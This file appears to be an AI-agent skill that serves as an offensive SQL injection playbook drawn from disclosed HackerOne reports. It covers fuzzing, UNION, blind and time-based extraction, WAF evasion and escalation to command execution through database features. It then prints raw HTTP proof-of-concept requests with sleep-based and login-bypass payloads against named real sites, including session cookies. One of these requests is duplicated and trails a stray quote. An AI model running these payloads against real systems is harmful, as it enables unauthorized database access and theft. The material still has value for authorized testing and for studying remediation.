---
name: sql-injection
description: "SQL Injection offensive playbook from 81 disclosed HackerOne reports (39 critical, 25 high, 13 medium, 4 low). Use when hunting or reviewing sql injection. Triggers: sql, injection, database, attacker, parameter."
license: "For authorized security testing and education only."
---

# SQL Injection

> Distilled from **81** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

User input reaches a SQL query unparameterized, allowing data theft, authentication bypass, or in some cases RCE via the database.

## Where to hunt

- Fuzz parameters (including JSON, headers, ORDER BY, LIMIT, and search) with `'`, `"`, `)`, and boolean/time payloads.
- Watch for error messages, response-length changes (boolean-based), and response delays (time-based).

## Exploitation playbook

- UNION-based extraction once column count/type is known; error-based to dump via error text.
- Boolean/time-based blind to exfiltrate byte-by-byte when there is no visible output.
- Auth bypass with `' OR '1'='1' -- ` style payloads on login.

## Bypass techniques

- WAF evasion: inline comments, case toggling, encoding, whitespace alternatives, `/*!...*/`.
- Second-order: inject via a stored value that is later used unsafely in another query.

## Impact & escalation

- Read secrets/hashes, write files (`INTO OUTFILE`), stacked queries, or DB-feature RCE (`xp_cmdshell`, UDF).

## Remediation

- Parameterized queries/prepared statements everywhere, least-privilege DB accounts, allowlist ORDER BY columns, disable dangerous DB features.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#865436](https://hackerone.com/reports/865436)  -  SQL Injection on the administrator panel
*critical*

```http
POST /webadmin/index.php HTTP/1.1
Host: mtngbissau.com
Referer: https://mtngbissau.com/webadmin/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Cookie: PHPSESSID=74db1535be320f591b6106253ad77191; SERVERID68971=262072|Xq8Kv|Xq8Ip

login=user'&pass=uesse
```

### 2. [#1069531](https://hackerone.com/reports/1069531)  -  Blind SQL Injection
*critical*

```http
POST /signin/ HTTP/1.1
Host: futexpert.mtngbissau.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://futexpert.mtngbissau.com
Referer: https://futexpert.mtngbissau.com/signin/
Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5

phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar
```

### 3. [#374027](https://hackerone.com/reports/374027)  -  blind sql injection
*high*

```http
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendip…
Host: betterscience.org
```

### 4. [#374027](https://hackerone.com/reports/374027)  -  blind sql injection
*high*

```http
GET /plugin/tag/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://betterscience.org:443/
Cookie: s9y_556bfeaw76g87a7643w7826384391f0=34583y4kj5ger78af32jh54g24; serendipity[url]=1; serendip…
Host: betterscience.org

'''
```

### 5. [#1224660](https://hackerone.com/reports/1224660)  -  bypass sql injection #1109311
*medium*

```http
POST /wp-login.php HTTP/2
Host: www.acronis.cz
Cookie: PHPSESSID=49kn3h0ecv1urjd70jucn2j4gh; _fbp=fb.1.1623467463578.959472854; wordpress_test_cookie=WP+Cookie+check
Referer: https://www.acronis.cz/wp-login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 717
Origin: https://www.acronis.cz
```

### 6. [#838855](https://hackerone.com/reports/838855)  -  [www.zomato.com] Blind SQL Injection in /php/geto2banner
*critical, $2,000*

```http
POST /php/geto2banner HTTP/1.1
Host: www.zomato.com
Content-Length: 73
Content-type: application/x-www-form-urlencoded

res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
```

More payloads: see [payloads.md](payloads.md) (96 curated).

## Recurring patterns in this dataset

Most frequent terms across the 81 reports (term (count)): `sql` (108), `injection` (95), `database` (24), `attacker` (19), `parameter` (19), `blind` (15), `arbitrary` (14), `through` (13), `discovered` (13), `allowed` (13), `access` (11), `found` (10), `code` (10), `sqli` (10), `sensitive` (9), `potentially` (8), `data` (8), `execute` (8)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#383127](https://hackerone.com/reports/383127) | critical | $25,000 | valve | SQL Injection in report_xml.php through countryFilter[] parameter |
| [#403616](https://hackerone.com/reports/403616) | critical | $4,500 | eternal | [www.zomato.com] SQLi - /php/██████████ - item_id |
| [#2051931](https://hackerone.com/reports/2051931) | critical | $4,134 | indrive | Blind SQL injection on id.indrive.com |
| [#952501](https://hackerone.com/reports/952501) | critical | $2,000 | eternal | Solr Injection in `user_id` parameter at :/v2/leaderboard_v2.json |
| [#838855](https://hackerone.com/reports/838855) | critical | $2,000 | eternal | [www.zomato.com] Blind SQL Injection in /php/geto2banner |
| [#836079](https://hackerone.com/reports/836079) | critical | $2,000 | eternal | [www.zomato.com] Blind SQL Injection in /php/widgets_handler.php |
| [#300176](https://hackerone.com/reports/300176) | critical | $1,000 | eternal | [https://reviews.zomato.com] Time Based SQL Injection |
| [#358669](https://hackerone.com/reports/358669) | critical | $1,000 | eternal | [www.zomato.com] SQLi on `order_id` parameter |

*See [reference.md](reference.md) for all 81 reports in this class.*
